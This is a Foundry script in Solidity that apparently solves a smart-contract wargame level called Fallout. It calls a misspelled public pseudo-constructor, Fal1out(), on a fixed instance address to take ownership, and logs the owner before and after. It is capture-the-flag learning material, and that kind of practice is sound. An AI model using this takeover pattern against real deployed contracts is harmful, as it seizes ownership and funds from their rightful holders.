// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallout} from "../src/L2Fallout.sol";

contract L2FalloutAttack is Script {
    // Your instance address
    Fallout fallout = Fallout(payable(0x440C0fCDC317D69606eabc35C0F676D1a8251Ee1));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before:", fallout.owner());
        fallout.Fal1out();
        console.log("Owner after", fallout.owner());
        vm.stopBroadcast();
    }
}
